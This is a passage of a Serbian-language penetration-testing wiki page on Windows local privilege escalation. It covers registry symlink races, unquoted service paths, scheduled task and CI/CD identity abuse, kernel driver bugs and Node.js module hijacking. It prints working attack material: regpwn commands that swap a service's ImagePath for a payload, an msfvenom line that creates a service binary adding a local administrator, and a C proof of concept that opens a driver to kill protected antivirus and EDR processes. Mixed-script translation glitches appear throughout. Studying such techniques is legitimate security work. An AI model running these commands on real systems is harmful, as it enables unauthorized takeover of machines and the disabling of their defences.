Neke Windows funkcije pristupačnosti kreiraju ključeve **ATConfig** po korisniku, koje proces **SYSTEM** kasnije kopira u ključ sesije u HKLM. Trka sa **simboličkom vezom** u registru može da preusmeri taj privilegovani upis na **bilo koju putanju u HKLM**, čime se dobija mogućnost **upisa proizvoljne vrednosti** u HKLM.<sup>[[18]](#references)</sup>

Lokacije ključeva (primer: tastatura na ekranu `osk`):

- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\ATs` navodi instalirane funkcije pristupačnosti.
- `HKCU\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\ATConfig\<feature>` čuva konfiguraciju koju korisnik može da kontroliše.
- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\Session<session id>\ATConfig\<feature>` kreira se tokom prijave ili prelaska na bezbednu radnu površinu i korisnik može da ga menja.

Tok zloupotrebe (CVE-2026-24291 / ATConfig):

1. Postavite vrednost u **HKCU ATConfig** koju želite da upiše SYSTEM.
2. Pokrenite kopiranje na bezbednu radnu površinu (npr. **LockWorkstation**), čime se pokreće tok AT broker-a.
3. **Pobедите у трци** tako što ćete postaviti **oplock** na `C:\Program Files\Common Files\microsoft shared\ink\fsdefinitions\oskmenu.xml`; kada se oplock aktivira, zamenite ključ **HKLM Session ATConfig** ključem **registry link** koji upućuje na zaštićenu ciljnu putanju u HKLM.
4. SYSTEM upisuje vrednost koju je izabrao napadač na preusmerenu putanju u HKLM.

Kada dobijete mogućnost proizvoljnog upisa vrednosti u HKLM, pređite na LPE tako što ćete prepisati vrednosti konfiguracije servisa:

- `HKLM\SYSTEM\CurrentControlSet\Services\<svc>\ImagePath` (EXE/komandna linija)
- `HKLM\SYSTEM\CurrentControlSet\Services\<svc>\Parameters\ServiceDll` (DLL)

Izaberite servis koji običan korisnik može da pokrene (npr. **`msiserver`**) i pokrenite ga nakon upisa. **Napomena:** javna implementacija exploita **zaključava radnu stanicu** kao deo trke.

Primer alata (RegPwn BOF / samostalno):<sup>[[19]](#references)</sup>

```bash
beacon> regpwn C:\payload.exe SYSTEM\CurrentControlSet\Services\msiserver ImagePath
beacon> regpwn C:\evil.dll SYSTEM\CurrentControlSet\Services\SomeService\Parameters ServiceDll
net start msiserver
```

### Services registry AppendData/AddSubdirectory permissions

Ako imate ovu dozvolu nad registrom, to znači da **možete da kreirate podregistre unutar njega**. U slučaju Windows servisa, ovo je **dovoljno za izvršavanje proizvoljnog koda:**


{{#ref}}
appenddata-addsubdirectory-permission-over-service-registry.md
{{#endref}}

### Unquoted Service Paths

Ako putanja do izvršne datoteke nije pod navodnicima, Windows će pokušati da izvrši svaki deo putanje pre razmaka.

Na primer, za putanju _C:\Program Files\Some Folder\Service.exe_ Windows će pokušati da izvrši:

```bash
C:\Program.exe
C:\Program Files\Some.exe
C:\Program Files\Some Folder\Service.exe
```

Izlistajte sve putanje servisa bez navodnika, osim onih koje pripadaju ugrađenim Windows servisima:

```bash
wmic service get name,pathname,displayname,startmode | findstr /i auto | findstr /i /v "C:\Windows" | findstr /i /v '\"'
wmic service get name,displayname,pathname,startmode | findstr /i /v "C:\Windows\system32" | findstr /i /v '\"'  # Not only auto services

# Using PowerUp.ps1
Get-ServiceUnquoted -Verbose
```

```bash
for /f "tokens=2" %%n in ('sc query state^= all^| findstr SERVICE_NAME') do (
	for /f "delims=: tokens=1*" %%r in ('sc qc "%%~n" ^| findstr BINARY_PATH_NAME ^| findstr /i /v /l /c:"c:\windows\system32" ^| findstr /v /c:"\""') do (
		echo %%~s | findstr /r /c:"[a-Z][ ][a-Z]" >nul 2>&1 && (echo %%n && echo %%~s && icacls %%s | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%") && echo.
	)
)
```

```bash
gwmi -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Where {$_.StartMode -eq "Auto" -and $_.PathName -notlike "C:\Windows*" -and $_.PathName -notlike '"*'} | select PathName,DisplayName,Name
```

**Ovu ranjivost možete otkriti i iskoristiti** pomoću metasploit-a: `exploit/windows/local/trusted\_service\_path` Servisni binarni fajl možete ručno kreirati pomoću metasploit-a:

```bash
msfvenom -p windows/exec CMD="net localgroup administrators username /add" -f exe-service -o service.exe
```

### Radnje oporavka

Windows omogućava korisnicima da navedu radnje koje će se izvršiti ako usluga otkaže. Ova funkcija se može konfigurisati tako da upućuje na binarnu datoteku. Ako je moguće zameniti tu datoteku, može biti moguća eskalacija privilegija. Više detalja možete pronaći u [zvaničnoj dokumentaciji](<https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-R2-and-2008/cc753662(v=ws.11)?redirectedfrom=MSDN>).

## Ciljevi skripti zakazanih zadataka

Za omogućeni zadatak koji pokreće `cmd.exe /c` sa `.bat` ili `.cmd` datotekom, proverite skriptu navedenu u **argumentima radnje**, kao i `cmd.exe`. Isto važi i za eksplicitni argument datoteke interpreteru, kao što je PowerShell `-File`. Ako zakazana batch datoteka sadrži doslovni poziv PowerShell-a sa `-File`, proverite i ACL te navedene skripte; promenljive, uslovne naredbe i ulančavanje komandi zahtevaju ručno praćenje. Skripta ili nadređeni direktorijum u koji pozivalac može da upisuje predstavljaju mogućnost izvršavanja preko naloga samo kada se principal konfigurisane radnje razlikuje od pozivaoca i kada zadatak zaista dođe do te radnje. ACL koji dozvoljava samo dodavanje može biti relevantan za skripte, ali prethodni `exit` ili drugi tok kontrole može onemogućiti izvršavanje dodatih linija. Pre nego što utvrdite da je eskalacija moguća, potvrdite efektivne ACL-ove, [kontekst izvršavanja zadatka](https://learn.microsoft.com/en-us/windows/win32/taskschd/security-contexts-for-running-tasks), radni direktorijum, okidač i pravila kontrole aplikacija. Inventarisanje ne bi trebalo da menja skriptu niti da pokreće zadatak.

## Named streams u pristupačnim datotekama

Na NTFS-u, čitljiva datoteka može da ima imenovani `:$DATA` stream čiji sadržaj nije prikazan u uobičajenom ispisu direktorijuma. Za mali, relevantan skup dostupnih rezervnih kopija ili konfiguracionih datoteka, pregledajte **imena i veličine** stream-ova pre otvaranja bilo kog sadržaja; Windows im omogućava pristup preko [`FindFirstStreamW` / `FindNextStreamW`](https://learn.microsoft.com/en-us/windows/win32/fileio/file-streams), a PowerShell preko [`Get-Item -Stream *`](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.management/get-item). Ime stream-a koje nagoveštava da sadrži tajnu samo je trag. Proverite efektivni pristup za čitanje datoteke, podršku sistema datoteka za stream-ove, da li stream sadrži upotrebljive akreditive i na koji se nalog oni zaista autentifikuju. Tokom rutinskog popisivanja izbegavajte rekurzivno skeniranje stream-ova i ispisivanje njihovog sadržaja.

## Ulazi pomoćnog programa Windows Driver Kit koji koristi zakazani zadatak

Opcioni Windows Driver Kit sadrži `StandaloneRunner.exe`, koji iz svog direktorijuma za pokretanje može da koristi `command.txt`, `reboot.rsf` i datoteku projekta `working\rsf.rsf`. Zakazani zadatak ili usluga koja pokreće ovaj pomoćni program sa privilegovanim nalogom može da omogući izvršavanje komandi u kontekstu tog naloga ako korisnik sa niskim privilegijama može da upisuje u te ulazne datoteke, čak i kada je sama izvršna datoteka zaštićena. Potvrdite da ih koristi privilegovani proces i da je moguće kreirati ili izmeniti **obe** pomoćne datoteke; samo pronalaženje pomoćnog programa nije dovoljno.

Kod zakazanog zadatka, pregledajte [`WorkingDirectory`](https://learn.microsoft.com/en-us/windows/win32/taskschd/execaction-workingdirectory) u njegovoj radnji i ACL-ove dve pomoćne putanje. Ako zadatak ne navodi radni direktorijum, direktorijum izvršne datoteke je samo trag koji treba proveriti, a ne dokaz da zadatak odatle čita ulazne datoteke. Takođe mora biti ispunjen preduslov za datoteku projekta. Proverite stvarni principal zadatka umesto da pretpostavljate da se zadatak pokreće kao SYSTEM.

## Aplikacije

### Instalirane aplikacije

Proverite **dozvole nad binarnim datotekama** (možda možete da zamenite neku od njih i eskalirate privilegije) i nad **direktorijumima** ([DLL Hijacking](dll-hijacking/index.html)).

```bash
dir /a "C:\Program Files"
dir /a "C:\Program Files (x86)"
reg query HKEY_LOCAL_MACHINE\SOFTWARE

Get-ChildItem 'C:\Program Files', 'C:\Program Files (x86)' | ft Parent,Name,LastWriteTime
Get-ChildItem -path Registry::HKEY_LOCAL_MACHINE\SOFTWARE | ft Name
```

#### Putanja za popravku Windows agenta Checkmk

[CVE-2024-0670](https://checkmk.com/werk/16361) utiče na starije Windows agente Checkmk koji su upisivali komandne datoteke u `C:\Windows\Temp`, a zatim izvršavali postojeću datoteku zaštićenu od pisanja kada zamena nije uspela. Proizvođač je ispravio problem u verzijama 2.1.0p40, 2.2.0p23, 2.3.0b1 i 2.4.0b1. Proverite pun nivo instalirane zakrpe i da li se može pokrenuti pogođena operacija agenta; sama oznaka grane, kao što je `2.1`, ne može da utvrdi izloženost. Enumeracija može da proveri verziju, stanje servisa i dozvole za Temp bez kreiranja datoteka ili pokretanja komandi agenta.

#### Pregled SAML servisa ADSelfService Plus

[CVE-2022-47966](https://www.manageengine.com/security/advisory/CVE/cve-2022-47966.html) je uticao na ADSelfService Plus, verziju 6210 i starije; proizvođač je ispravio problem u verziji 6211. Relevantan je samo ako je SAML SSO **omogućen ili je ranije bio omogućen**. Zato su zapis o instaliranom proizvodu ili putanja servisa samo naznaka, a ne potvrda ranjivosti: potvrdite tačnu verziju, istoriju SAML konfiguracije, mrežnu dostupnost servisa i nalog pod kojim se izvršava. Izvršavanje koda preko servisa nasleđuje privilegije tog naloga; izvršavanje kao SYSTEM zahteva instancu koja radi kao SYSTEM. Čitljiva datoteka `OfflineBackup_*.ezip` u direktorijumu Backup proizvoda zasebna je naznaka šifrovane rezervne kopije, a ne dokaz upotrebljivih akreditiva ili ove SAML ranjivosti. Tokom rutinske enumeracije zabeležite njenu putanju i prava pristupa, bez raspakivanja.

#### Granice Jenkins kontrolera i domenskog naloga

Na Windows Jenkins kontroleru razlikujte dozvolu za kreiranje ili konfigurisanje posla od dozvole za njegovo pokretanje: [Jenkins dokumentuje ove dozvole odvojeno kao `Job/Create`, `Job/Configure` i `Job/Build`](https://www.jenkins.io/doc/book/security/access-control/permissions/). Konfigurisani raspored ili udaljeni okidač mogu da pruže drugi način pokretanja izgradnje, ali potvrdite da je omogućen i da se izgradnja zaista izvršava. Izvršavanje koristi identitet kontrolera ili izabranog agenta, a sačuvani akreditiv je upotrebljiv samo ako posao može da pristupi njegovom opsegu. Zasebno proverite pristup metapodacima u `JENKINS_HOME`: Jenkins čuva materijal akreditiva i ključeve za šifrovanje u datotekama `credentials.xml`, `secrets/hudson.util.Secret` i `secrets/master.key` ([Jenkinsovo skladištenje tajni](https://www.jenkins.io/doc/developer/security/secrets/)). Njihovo prisustvo samo po sebi ne otkriva lozinku; proverite **pristup za čitanje potrebnih datoteka** i zaseban put ponovne upotrebe naloga, bez ispisivanja tajni u deljenom izlazu. Ako taj nalog ima pravo pisanja u AD korisničkom objektu za `scriptPath`, potvrdite da je putanja skripte upisiva i da postoji stvarna prijava ili zakazani proces koji je koristi, a izvršava se kao ciljni korisnik, pre nego što to smatrate izvršavanjem kao drugi korisnik. Za dodatnu kontrolu grupe potrebna su zasebno proverena efektivna AD prava.

#### Identitet samostalno hostovanog agenta Azure Pipelines

Za Azure DevOps Server ili projekat Azure Pipelines razlikujte dozvolu za **kreiranje ili uređivanje** pipeline-a od dozvole za njegovo **stavljanje u red čekanja** i korišćenje izabranog skupa agenata; [Microsoft zasebno dokumentuje dozvole za pipeline](https://learn.microsoft.com/en-us/azure/devops/pipelines/policies/permissions?view=azure-devops) i [autorizaciju skupova agenata](https://learn.microsoft.com/en-us/azure/devops/pipelines/agents/pools-queues?view=azure-devops). Ako nalog sa nižim privilegijama može da pošalje korak skripte i pokrene taj pipeline na samostalno hostovanom Windows agentu, korak se izvršava kao [konfigurisani nalog operativnog sistema agenta](https://learn.microsoft.com/azure/devops/pipelines/agents/agents). Pre nego što tvrdite da postoji prelazak na drugog korisnika ili SYSTEM, proverite konkretan pipeline, ograničenja grana/resursa, autorizovani skup, posao koji može da se pokrene i identitet servisnog naloga agenta. Instalirani agent, uloga u projektu ili pravo pisanja u repozitorijum samo su naznake; tokom pasivne enumeracije pregledajte dozvole i lokalne metapodatke servisa bez pokretanja izgradnje.

#### Akreditivi usluge Microsoft Entra Connect Sync

[Microsoft pravi razliku](https://learn.microsoft.com/en-us/entra/identity/hybrid/connect/reference-connect-accounts-permissions) između **servisnog naloga ADSync**, koji pokreće servis za sinhronizaciju i pristupa njegovoj SQL bazi podataka, i **naloga AD DS konektora**, čije dozvole u direktorijumu zavise od konfigurisаних funkcija sinhronizacije. Akreditivi konektora čuvaju se šifrovani u toj bazi podataka, a ključni materijal je [zaštićen pomoću DPAPI-ja pod servisnim nalogom ADSync](https://learn.microsoft.com/en-us/entra/identity/hybrid/connect/concept-adsync-service-account). Samo instaliran servis za sinhronizaciju, grupa čiji naziv sugeriše lokalna administratorska prava ili pristup bazi podataka ne dokazuju da se akreditiv može dešifrovati niti da je moguća eskalacija u domenu. Zasebno proverite stvarna prava čitanja baze podataka, pristup servisnog naloga/ključevima, raspored instalacije i SQL-a, konfigurisani identitet konektora i efektivne AD privilegije tog identiteta. Rutinska enumeracija treba da prikaže samo metapodatke servisa i pristupa, a ne da upituje ili ispisuje sačuvane tajne.

#### Dozvole za podržavajuće DLL-ove drajvera štampača

Instalirani drajver štampača može da čuva podržavajuće DLL-ove u `C:\ProgramData` i da ih učitava u privilegovanijem procesu za štampanje. Proverite tačan direktorijum drajvera i ACL-ove DLL-ova, uključujući nadređene direktorijume i tačke ponovnog raščlanjivanja, čak i ako je enumeracija WMI-ja za štampače zabranjena. Za [problem sa drajverom štampača Ricoh CVE-2019-19363](https://www.ricoh.com/info/2020/0122_1), navedena putanja bila je `C:\ProgramData\RICOH_DRV\<driver>\_common\dlz`; [prvobitno otkrivanje](https://www.pentagrid.ch/de/blog/local-privilege-escalation-in-ricoh-printer-drivers-for-windows-cve-2019-19363/) opisuje učitavanje DLL-ova pomoću `PrintIsolationHost.exe`. ACL koji dozvoljava pisanje samo je naznaka: proverite efektivni pristup za pisanje nakon primene zabranjujućih unosa, da li je relevantni drajver instaliran i učitava li datoteku pod privilegovanim identitetom, kao i da li je proizvođač ispravio instalaciju ažuriranim drajverom ili bezbednosnim programom. Nemojte zaključivati da postoji ranjivost samo na osnovu naziva direktorijuma ili verzije drajvera.

### Dozvole za pisanje

Proverite da li možete da izmenite neku konfiguracionu datoteku kako biste pročitali neku posebnu datoteku ili da li možete da izmenite binarnu datoteku koju će izvršiti administratorski nalog (schedtasks).

Jedan od načina da pronađete slabe dozvole za direktorijume/datoteke u sistemu jeste da pokrenete:

```bash
accesschk.exe /accepteula
# Find all weak folder permissions per drive.
accesschk.exe -uwdqs Users c:\
accesschk.exe -uwdqs "Authenticated Users" c:\
accesschk.exe -uwdqs "Everyone" c:\
# Find all weak file permissions per drive.
accesschk.exe -uwqs Users c:\*.*
accesschk.exe -uwqs "Authenticated Users" c:\*.*
accesschk.exe -uwdqs "Everyone" c:\*.*
```

```bash
icacls "C:\Program Files\*" 2>nul | findstr "(F) (M) :\" | findstr ":\ everyone authenticated users todos %username%"
icacls ":\Program Files (x86)\*" 2>nul | findstr "(F) (M) C:\" | findstr ":\ everyone authenticated users todos %username%"
```

```bash
Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'Everyone'} } catch {}}

Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'BUILTIN\Users'} } catch {}}
```

### Notepad++ automatsko učitavanje plugina radi opstanka/izvršavanja

Notepad++ automatski učitava svaki DLL plugin iz svojih podfoldera `plugins`. Ako postoji prenosiva/kopirana instalacija sa dozvolom za upis, ubacivanje zlonamernog plugina omogućava automatsko izvršavanje koda unutar `notepad++.exe` pri svakom pokretanju (uključujući izvršavanje iz `DllMain` i povratnih poziva plugina).

{{#ref}}
notepad-plus-plus-plugin-autoload-persistence.md
{{#endref}}

### Pokretanje pri startovanju

**Proverite da li možete da prepišete neki ključ registra ili binarnu datoteku koja će biti izvršena pod drugim korisnikom.**\
**Pročitajte** **sledeću stranicu** da biste saznali više o zanimljivim **lokacijama za automatsko pokretanje radi eskalacije privilegija**:


{{#ref}}
privilege-escalation-with-autorun-binaries.md
{{#endref}}

### Drajveri

Potražite moguće **sumnjive/ranjive drajvere trećih strana**

```bash
driverquery
driverquery.exe /fo table
driverquery /SI
```

Ako driver izlaže primitivu za proizvoljno čitanje/pisanje u kernelu (što je često slučaj kod loše dizajniranih IOCTL handlera), možete eskalirati privilegije direktnom krađom SYSTEM tokena iz kernel memorije.<sup>[[13]](#references)</sup> Detaljna tehnika, korak po korak, nalazi se ovde:

{{#ref}}
arbitrary-kernel-rw-token-theft.md
{{#endref}}

{{#ref}}
windows-kernel-rootkits-and-dkom.md
{{#endref}}

{{#ref}}
kernel-mode-file-access-check-bypass.md
{{#endref}}

Povezani materijali o Windows kernel eksploataciji:

{{#ref}}
../../binary-exploitation/windows-kernel-type-confusion-to-npfs-arbitrary-rw.md
{{#endref}}

Kod grešaka usled race condition-a, kada ranjivi poziv otvara Object Manager putanju koju kontroliše napadač, namerno usporavanje pretrage (korišćenjem komponenti maksimalne dužine ili dubokih lanaca direktorijuma) može produžiti vremenski prozor sa nekoliko mikrosekundi na desetine mikrosekundi:

{{#ref}}
kernel-race-condition-object-manager-slowdown.md
{{#endref}}

{{#ref}}
../../binary-exploitation/windows-kernel-exploitation/afd-rio-buffer-uaf.md
{{#endref}}

{{#ref}}
../../binary-exploitation/windows-kernel-exploitation/usb-midi-packet-size-pool-overflow.md
{{#endref}}

#### UAF u cancel-safe redovima, otkrivanje podataka iz paged-pool-a i I/O ring pivoti

Neki Windows kernel LPE lanci mogu se sastaviti od dve zasebno slabe greške: **race condition-a u životnom veku cancel-safe reda** koja oslobađa zahtev/CBD dok je zaključavanje reda još uvek aktivno, i otkrivanja podataka zbog **otpuštanja zaključavanja pre kopiranja**, koje otkriva oslobođenu alokaciju iz paged-pool-a tokom `RtlCopyToUser`.<sup>[[29]](#references)</sup>

Beleške o auditu i eksploataciji:

- **Oslobađanje pod zaključavanjem + naknadno otkazivanje**: potražite uspešnu putanju koja radi **Acquire -> CompleteRequest/free -> Release**, dok putanja otkazivanja radi **Acquire -> RemoveIo(stale pointer) -> Release -> CompleteCanceledIo**. Ako uspešna putanja dođe do `FltCompletePendedPreOperation` / `FltpFreeIrpCtrl` pre otpuštanja CBDQ/CSQ zaključavanja, nit blokirana u `NtCancelIoFileEx -> IopCsqCancelRoutine` može kasnije nastaviti i proslediti oslobođeni `PFLT_CALLBACK_DATA` callback-u drajvera za uklanjanje.
- **Ponovo iskoristite oslobođeni objekat reda** pomoću paged-pool alokacije iste veličine koju kontroliše napадач. `NPFS` Data Queue Entries su korisni jer je moguće kontrolisati njihov sadržaj i veličinu, a kasnije ih ispitati pipe read/peek operacijama. Ako oslobođeni objekat sadrži list links, prepišite ih **cikličnom listom lažnih request čvorova u korisničkoj memoriji**, tako da drajver više puta obrađuje strukture zahteva definisane przez napadaча, umesto da se zaustavi na početnoj glavi liste.
- **Nadogradite predvidljivo upisivanje**: ako lažni zahtev preusmeri ugnježdeni context pointer koji se koristi za bookkeeping upise (vremenske oznake / QPC / polja uz refcount), možda ćete dobiti upis u kernel memoriju čiju adresu kontrolišete, ali ne i vrednost. U tom slučaju, ciljajte polje **length/size** sprayed pool objekta umesto konačnog code/data pointer-a, pa zatim prođite kroz spray dok oštećeni objekat ne omogući **paged-pool čitanje van granica**.
- **Obrazac podložan race condition-u za otkrivanje podataka**: svaki syscall koji radi `ptr = obj->Buffer; unlock(obj); RtlCopyToUser(dst, ptr, size)` dobar je kandidat. Pouzdanost se povećava ako napadaч može da uveća kopirani buffer (na primer, dodavanjem mnogo list/resource stavki koje povećavaju konačnu veličinu alokacije serijalizatora), jer duže kopiranje proširuje prozor za zamenu bez nužnog rušenja sistema.
- **Ciljevi za dopunu bogati pointer-ima**: registrovani buffer nizovi Windows **I/O ring-a** odlični su ciljevi za otkrivanje podataka jer je njihova paged-pool veličina pod kontrolom napadaча (`8 * regBufferCnt`), a svaki element je kernel pointer ka `_IOP_MC_BUFFER_ENTRY`. Otkrijte jedan od ovih nizova, pronađite okolni `IORING_OBJECT`, pa zatим oštetite **`RegBuffers`** i **`RegBuffersCount`** tako da naredne I/O ring operacije koriste lažne stavke koje je napravio napadaч i omoguće proizvoljno čitanje/pisanje u kernelu. Ako jedini dostupan upis daje stabilan bajt (na primer, iz `KUSER_SHARED_DATA+0x14`), koristite **preklapajuće, neporavnate upise** da napravite ponovljeni korisnički pointer kao što je `0x0101010101010101`, mapirajte ga pomoću `VirtualAlloc` i tamo smestite lažni niz registrovanih bafera.<sup>[[30]](#references)</sup>

Korisni indikatori za otklanjanje grešaka:

```text
NtCancelIoFileEx -> IopCsqCancelRoutine -> <driver>!RemoveIo
<driver> success path: Acquire -> CompleteRequest/free -> Release
RtlCopyToUser after releasing the object lock
ExAllocatePool2(..., 8 * regBufferCnt, 'BRrI')-style variable-sized pointer arrays
```

Kada iz korumpiranog I/O ring-a dobijete proizvoljan kernel read/write, ukradite SYSTEM token standardnim post-primitive postupkom:

{{#ref}}
arbitrary-kernel-rw-token-theft.md
{{#endref}}

#### Primitivi za korupciju memorije registry hive-a

Savremene ranjivosti hive-ova omogućavaju pripremu determinističkih rasporeda, zloupotrebu upisivih potomaka HKLM/HKU i pretvaranje korupcije metapodataka u prekoračenja kernel paged pool-a bez prilagođenog drajvera. Ceo lanac je opisan ovde:

{{#ref}}
windows-registry-hive-exploitation.md
{{#endref}}

#### Zbrka tipova u direct režimu funkcije `RtlQueryRegistryValues` zbog putanja koje kontroliše napadač

Neki drajveri prihvataju putanju registry-ja iz userland-a, proveravaju samo da li je to ispravan UTF-16 niz, a zatim pozivaju `RtlQueryRegistryValues(RTL_REGISTRY_ABSOLUTE, userPath, ...)` sa `RTL_QUERY_REGISTRY_DIRECT` i prosleđuju pokazivač na skalarni tip na steku, kao što je `int readValue`. Ako nedostaje `RTL_QUERY_REGISTRY_TYPECHECK`, `EntryContext` se tumači prema **stvarnom** tipu registry-ja, a ne tipu koji je programer očekivao.

Time nastaju dva korisna primitiva:<sup>[[24]](#references)[[25]](#references)</sup>

- **Zloupotreba zbunjenog posrednika / oracle**: apsolutna putanja `\Registry\...` koju kontroliše korisnik omogućava drajveru da upituje ključeve koje odabere napadač, otkriva njihovo postojanje putem povratnih kodova ili logova, a ponekad i čita vrednosti kojima pozivalac inače ne bi mogao direktno da pristupi.
- **Korupcija kernel memorije**: odredište skalarnog tipa, kao što je `&readValue`, pogrešno se tumači kao `REG_QWORD`, `UNICODE_STRING` ili bafer binarnih podataka određene veličine, u zavisnosti od tipa vrednosti u registry-ju.

Praktične napomene za eksploataciju:

- **Ublažavanje u Windows 8+**: ako upit pogodi **nepouzdani hive** uz `RTL_QUERY_REGISTRY_DIRECT`, ali bez `RTL_QUERY_REGISTRY_TYPECHECK`, kernel pozivaoci se ruše uz `KERNEL_SECURITY_CHECK_FAILURE (0x139)`. Da bi ranjivost ostala iskoristiva, tražite **ključeve koje napadač može da upisuje unutar pouzdanih sistemskih hive-ova**, umesto da pripremate vrednosti pod `HKCU`.
- **Priprema u pouzdanom hive-u**: koristite NtObjectManager za pronalaženje upisivih potomaka od `\Registry\Machine`, a zatim ponovo pokrenite skeniranje sa dupliranim tokenom **niskog integriteta** da biste pronašli ključeve dostupne iz sandbox-ovanih konteksta:<sup>[[26]](#references)</sup>

```powershell
Get-AccessibleKey \Registry\Machine -Recurse -Access SetValue
$token = Get-NtToken -Primary -Duplicate -IntegrityLevel Low
Get-AccessibleKey \Registry\Machine -Recurse -Access SetValue -Token $token
```

- **`REG_QWORD`**: direktan upis od 8 bajtova u 4-bajtni `int` oštećuje susedne podatke na steku i može delimično da prepiše obližnji pokazivač na callback/funkciju.
- **`REG_SZ` / `REG_EXPAND_SZ`**: direktni režim očekuje da `EntryContext` pokazuje na `UNICODE_STRING`. Ako kod prvo učita `REG_DWORD` koji kontroliše napadač u skalarni podatak na steku, a zatim ponovo iskoristi isti bafer za čitanje stringa, napadač kontroliše `Length`/`MaximumLength` i delimično utiče na pokazivač `Buffer`, što omogućava delimično kontrolisan upis u kernel.
- **`REG_BINARY`**: kod velikih binarnih podataka, direktni režim tretira prvi `LONG` na adresi `EntryContext` kao veličinu bafera sa predznakom. Ako prethodno čitanje `REG_DWORD` ostavi negativnu vrednost koju kontroliše napadač u ponovo iskorišćenom skalarnom podatku, sledeći `REG_BINARY` upit kopira bajtove napadača direktno preko susednih slotova na steku. To je često najjednostavniji način da se u potpunosti prepiše pokazivač na callback.

Obrazac koji vredi tražiti: **čitanja različitih tipova iz registra u istu promenljivu na steku bez njenog ponovnog inicijalizovanja**. Pretražujte `RTL_REGISTRY_ABSOLUTE`, `RTL_QUERY_REGISTRY_DIRECT`, ponovo korišćene pokazivače `EntryContext` i putanje koda u kojima prvo čitanje iz registra određuje da li će doći do drugog čitanja.

#### Zloupotreba nedostajućeg FILE_DEVICE_SECURE_OPEN na objektima uređaja (LPE + EDR kill)

Neki potpisani upravljački programi trećih strana kreiraju svoj objekat uređaja sa strogim SDDL-om koristeći IoCreateDeviceSecure, ali zaborave da postave FILE_DEVICE_SECURE_OPEN u DeviceCharacteristics. Bez ove zastavice, bezbedni DACL se ne sprovodi kada se uređaju pristupa putem putanje koja sadrži dodatnu komponentu, pa svaki neprivilegovani korisnik može da dobije handle koristeći putanju imenskog prostora kao što je:<sup>[[14]](#references)</sup>

- \\ .\\DeviceName\\anything
- \\ .\\amsdk\\anyfile (iz slučaja iz stvarnog sveta)

Kada korisnik može da otvori uređaj, može da zloupotrebi privilegovane IOCTL-ove koje upravljački program izlaže radi LPE-a i neovlašćenih izmena. Primeri mogućnosti uočenih u praksi:
- Vraćanje handle-ova sa punim pristupом произвољним процесима (крађа токена / SYSTEM љуска преко DuplicateTokenEx/CreateProcessAsUser).
- Неограничено читање/писање на сирови диск (неовлашћене измене ван мреже, трикови за постојаност при покретању).
- Прекидање произвољних процеса, укључујући Protected Process/Light (PP/PPL), што омогућава гашење AV/EDR-а из корисничког режима преко кернела.

Минимални образац PoC-а (кориснички режим):
```c
// Example based on a vulnerable antimalware driver
#define IOCTL_REGISTER_PROCESS  0x80002010
#define IOCTL_TERMINATE_PROCESS 0x80002048

HANDLE h = CreateFileA("\\\\.\\amsdk\\anyfile", GENERIC_READ|GENERIC_WRITE, 0, 0, OPEN_EXISTING, 0, 0);
DWORD me = GetCurrentProcessId();
DWORD target = /* PID to kill or open */;
DeviceIoControl(h, IOCTL_REGISTER_PROCESS,  &me,     sizeof(me),     0, 0, 0, 0);
DeviceIoControl(h, IOCTL_TERMINATE_PROCESS, &target, sizeof(target), 0, 0, 0, 0);
```

Ublažavanje rizika za programere
- Uvek postavite FILE_DEVICE_SECURE_OPEN pri kreiranju objekata uređaja kojima treba ograničiti pristup pomoću DACL-a.
- Proveravajte kontekst pozivaoca za privilegovane operacije. Dodajte PP/PPL provere pre nego što dozvolite prekid procesa ili vraćanje handle-ova.
- Ograničite IOCTL-ove (maske pristupa, METHOD_*, validacija ulaza) i razmotrite posredničke modele umesto direktnih privilegija jezgra.

Ideje za detekciju za odbrambene timove
- Nadgledajte otvaranje sumnjivih imena uređaja iz korisničkog režima (npr. \\ .\\amsdk*) i određene sekvence IOCTL-ova koje ukazuju na zloupotrebu.
- Sprovodite Microsoftovu listu blokiranih ranjivih drajvera (HVCI/WDAC/Smart App Control) i održavajte sopstvene liste dozvoljenih/zabranjenih stavki.


## PATH DLL Hijacking

Ako imate **dozvole za pisanje unutar fascikle koja se nalazi u PATH-u**, možda ćete moći da otmete DLL koji učitava proces i **eskalirate privilegije**.<sup>[[2]](#references)</sup>

Proverite dozvole za sve fascikle unutar PATH-a:

```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```

Za više informacija o tome kako da zloupotrebite ovu proveru:


{{#ref}}
dll-hijacking/writable-sys-path-dll-hijacking-privesc.md
{{#endref}}

## Otimanje razrešavanja Node.js / Electron modula preko `C:\node_modules`

Ovo je varijanta **Windows nekontrolisane putanje pretrage** koja utiče na aplikacije **Node.js** i **Electron** kada izvrše goli import, kao što je `require("foo")`, a očekivani modul **nedostaje**.<sup>[[20]](#references)</sup>

Node traži pakete tako što se kreće naviše kroz stablo direktorijuma i proverava fascikle `node_modules` u svakom nadređenom direktorijumu. U Windowsu ta pretraga može da stigne do korena diska, pa aplikacija pokrenuta iz `C:\Users\Administrator\project\app.js` može da proverava sledeće putanje:<sup>[[21]](#references)</sup>

1. `C:\Users\Administrator\project\node_modules\foo`
2. `C:\Users\Administrator\node_modules\foo`
3. `C:\Users\node_modules\foo`
4. `C:\node_modules\foo`

Ako **korisnik sa niskim privilegijama** može da kreira `C:\node_modules`, može da postavi zlonamerni `foo.js` (ili fasciklu paketa) i sačeka da **Node/Electron proces sa višim privilegijama** pokuša da razreši nedostajuću zavisnost. Payload se izvršava u sigurnosnom kontekstu procesa žrtve, pa to postaje **LPE** svaki put kada se ciljna aplikacija pokreće kao administrator, iz zakazanog zadatka/wrapper-a servisa sa povišenim privilegijama ili kao automatski pokrenuta desktop aplikacija sa povišenim privilegijama.

Ovo se naročito često dešava kada:

- je zavisnost navedena u `optionalDependencies`<sup>[[22]](#references)</sup>
